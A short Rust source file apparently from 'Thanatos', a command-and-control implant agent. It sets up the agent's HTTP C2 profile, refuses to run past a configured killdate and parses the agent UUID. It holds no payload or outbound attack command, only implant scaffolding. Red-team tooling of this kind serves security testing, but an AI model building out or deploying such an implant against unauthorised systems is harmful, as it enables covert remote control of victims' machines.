use http_profile::HttpC2Profile;
use thanatos_protos::config;

use crate::{
    errors::{ConfigParseError, ThanatosError},
    system,
};

enum C2Profile {
    Http(http_profile::HttpC2Profile),
}

struct ConfiguredProfile {
    profile: C2Profile,
    killdate: u64,
}

pub struct Agent {
    uuid: [u8; 16],
    profiles: Vec<ConfiguredProfile>,
}

impl Agent {
    pub fn initialize(agent_config: &config::Config) -> Result<Agent, ThanatosError> {
        let mut profiles = Vec::new();

        if let Some(ref http) = agent_config.http {
            profiles.push(ConfiguredProfile {
                profile: C2Profile::Http(HttpC2Profile::new(&agent_config)),
                killdate: http.killdate,
            })
        }

        if let Some(ref profile) = profiles.iter().max_by_key(|v| v.killdate) {
            let e = system::time::epoch_timestamp();
            if profile.killdate <= e {
                return Err(ThanatosError::PastKilldate);
            }
        } else {
            return Err(ThanatosError::OutOfProfiles);
        }

        Ok(Agent {
            uuid: agent_config
                .uuid
                .clone()
                .try_into()
                .map_err(|_| ThanatosError::ConfigParse(ConfigParseError::InvalidUuidLength))?,
            profiles,
        })
    }
}
